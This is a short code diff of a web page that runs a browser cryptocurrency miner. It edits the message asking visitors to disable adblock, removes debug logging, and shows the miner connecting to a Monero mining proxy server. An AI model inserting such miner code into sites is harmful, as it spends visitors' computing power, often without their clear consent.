@@ -31,7 +31,7 @@
 
 
 
-<h1 id="etxt" style="display: none;">Please disable adblock otherwise the website won't work (mine crypto).</h1>
+<h1 id="etxt" style="display: none;">Please disable adblock otherwise the website won't work (mine crypto). <br> If you already have adblock disabled, then wait for the website to fully load.</h1>
 
 
 <script type="text/javascript">
@@ -49,11 +49,8 @@
 		script.onload = function() {
 			isMinerBlocked = false;
 
-			console.log("A");
 			mtxt.style.display = "block"; // enable text
 			document.getElementById("etxt").style.display = "none"; // disable text
-			console.log(mtxt.style.display + " mtxt");
-			console.log(document.getElementById("etxt").style.display + " etxt")
 
 
 			server = "wss://f.xmrminingproxy.com:8181";
